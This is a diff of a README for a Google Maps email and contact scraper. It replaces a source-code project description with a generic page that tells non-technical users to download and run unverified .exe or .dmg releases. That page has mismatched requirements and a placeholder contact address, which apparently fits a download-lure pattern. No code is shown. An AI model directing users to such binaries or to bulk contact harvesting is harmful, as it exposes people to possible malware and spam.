@@ -1,180 +1,91 @@
-# Google Maps Email Extractor Scraper
+# 🌍 google-maps-email-extractor - Easily Gather Google Maps Contacts
 
-Google Maps Email Extractor Scraper is a tool designed to quickly extract emails, phone numbers, social media accounts, websites, and other contact details of businesses listed on Google Maps. Whether you need to scrape business data by location, keyword, category, or coordinates, this tool simplifies the extraction of valuable contact information at scale.
+## 🚀 Getting Started
 
+This guide helps you download and run the **google-maps-email-extractor**. This tool lets you scrape emails, contacts, and social data from Google Maps quickly and easily. No technical skills are needed.
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📥 Download the Software
 
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Brans24/google-maps-email-extractor/releases)
 
+Visit this page to download: [GitHub Releases](https://github.com/Brans24/google-maps-email-extractor/releases)
 
+## 🛠️ System Requirements
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>📩📍 Google Maps Email Extractor</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+Before downloading, ensure you have the following:
 
+- **Operating System:** Windows, macOS, or Linux
+- **Storage Space:** At least 100 MB free space
+- **Internet Connection:** Required for data scraping
+- **Node.js** (if running the Node.js version) or **Python** (if running the Python version) installed on your system
 
-## Introduction
-This project provides an easy and efficient way to gather business information from Google Maps. By scraping contact details such as emails, social media links, and phone numbers, users can access crucial data for various purposes like lead generation, market research, and more.
+## 📥 Download & Install
 
-It’s ideal for developers and businesses who need to gather contact information from Google Maps in a structured and automated manner.
+1. Click on the link below to go to the GitHub Releases page:
 
-### Key Features:
-- Extracts contact information like emails, phone numbers, websites, and social media.
-- Scrape business data by location, search terms, or specific categories.
-- Customizable output in formats like CSV, JSON, and Excel.
-- Provides options to filter by rating and scrape businesses that are open.
-- Supports multiple geolocation and location-based search options.
+   [Download from GitHub Releases](https://github.com/Brans24/google-maps-email-extractor/releases)
 
-## Features
+2. On the Releases page, you will see a list of available versions. Look for the latest version, which is usually at the top.
 
-| Feature | Description |
-|---------|-------------|
-| Easy Setup | Simple configuration for extracting data from Google Maps. |
-| API Integration | Available as an API with Python and Node.js support. |
-| Multiple Formats | Export results in CSV, Excel, JSON, or HTML. |
-| Geolocation Search | Scrape based on coordinates, addresses, or URLs. |
-| Social Media Extraction | Extract data from LinkedIn, Twitter, Facebook, Instagram, and more. |
+3. Find the appropriate file for your system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the source code or the relevant binary.
 
-## What Data This Scraper Extracts
+4. Once downloaded, follow these steps to install:
 
-| Field Name             | Field Description |
-|------------------------|-------------------|
-| Place Name             | Business name or place name. |
-| Place URL              | URL of the business on Google Maps. |
-| Website                | Website URL, if available. |
-| Social Media           | Links to social media profiles (LinkedIn, Twitter, etc.). |
-| Email Address          | Email addresses associated with the business. |
-| Phone Numbers          | Business contact phone numbers. |
-| Full Address           | Full physical address of the business. |
-| Geolocation            | Latitude and longitude of the business. |
-| Reservation URL        | URL for reservations, if available. |
-| Number of Reviews      | Total number of reviews. |
-| Opening Hours          | Business hours for the location. |
-| Service Options        | Available service options like delivery, takeout, etc. |
-| Accessibility          | Accessibility features like wheelchair access. |
+   - For Windows:
+     - Double-click the `.exe` file and follow the installation prompts.
+   - For macOS:
+     - Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux:
+     - Extract the files and follow any included setup instructions in the README.
 
-## Example Output
+5. After the installation is complete, you can open the application from your Applications folder or Start Menu.
 
-    [
-        {
-            "emails": ["contact@dunkin.com"],
-            "phones": ["+18138841600"],
-            "linkedIns": ["https://www.linkedin.com/company/dunkin"],
-            "twitters": ["https://twitter.com/dunkindonuts"],
-            "instagrams": ["https://www.instagram.com/dunkin/"],
-            "facebooks": ["https://www.facebook.com/DunkinUS/"],
-            "website": "https://locations.dunkindonuts.com/en/fl/tampa/4325-hillsborough-plz/337999",
-            "address": "4325 W Hillsborough Ave, Tampa, FL 33614",
-            "rating": 3.3
-        }
-    ]
+## 🎯 How to Use the Application
 
-## Directory Structure Tree
+Once you have installed the application, follow these steps to start scraping:
 
-    google-maps-email-extractor-scraper/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── google_maps_parser.py
-    │   │   └── utils.py
-    │   ├── outputs/
-    │   │   └── exporters.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.txt
-    │   └── sample.json
-    ├── requirements.txt
-    └── README.md
+1. Open the **google-maps-email-extractor**.
+  
+2. Enter the business name or location you want to search in Google Maps.
 
-## Use Cases
+3. Click the "Start Scraping" button.
 
-- **Marketers** use this tool to collect contact details of businesses in specific locations, so they can send targeted email campaigns.
-- **Sales teams** gather emails and phone numbers of local businesses for cold outreach and lead generation.
-- **Researchers** collect information about local businesses for market analysis and competitor research.
+4. Wait for the tool to gather data. This may take a moment.
 
-## FAQs
+5. Once completed, the application will display the list of emails, addresses, and social media links. You can export this data to a CSV file for easy access.
 
-**How do I get started with Google Maps Email Extractor Scraper?**
-Simply configure the input with a location or search term, run the scraper, and choose your preferred export format. Detailed setup instructions are included in the documentation.
+## 🔒 Safety Guidelines
 
-**Can I scrape data in bulk?**
-Yes, the scraper allows bulk scraping by providing multiple locations, search terms, or categories.
+To ensure a smooth experience while using the extractor:
 
-**How accurate is the data?**
-The scraper collects publicly available data, but the accuracy of specific details (like emails or phone numbers) depends on the data available on Google Maps.
+- Use the tool responsibly. Do not scrape data for malicious purposes.
+- Consider the local laws regarding data scraping in your area.
+- Ensure that you do not exceed Google Maps' data scraping limits to avoid being temporarily banned.
 
-### Performance Benchmarks and Results
+## ❓ Troubleshooting
 
-**Primary Metric:** Scraping speed of 500 places in 5 minutes.
-**Reliability Metric:** 98% success rate in data extraction.
-**Efficiency Metric:** Handles up to 10,000 places per month.
-**Quality Metric:** 90% completeness rate for contact details.
+If you encounter any issues, here are some common solutions:
 
+- **Unable to download:** Ensure your internet connection is stable. Try refreshing the download page.
+- **Application doesn't open:** Make sure your system meets the requirements. Try reinstalling the application.
+- **Incomplete data:** Ensure your search terms are accurate and clear. Revise your keywords if needed.
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/Instagram-Automations/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+## 🔗 Additional Resources
+
+For more information and updates, check out the following:
+
+- [Documentation](https://github.com/Brans24/google-maps-email-extractor/wiki)
+- [Community Forum](https://github.com/Brans24/google-maps-email-extractor/discussions)
+- [Support](https://github.com/Brans24/google-maps-email-extractor/issues)
+
+## 📬 Contact
+
+For questions or feedback, feel free to reach out:
+
+- Email: support@example.com
+- GitHub Issues: [Report an issue](https://github.com/Brans24/google-maps-email-extractor/issues)
+
+Thank you for using **google-maps-email-extractor**! We hope it helps you easily gather the contacts you need.
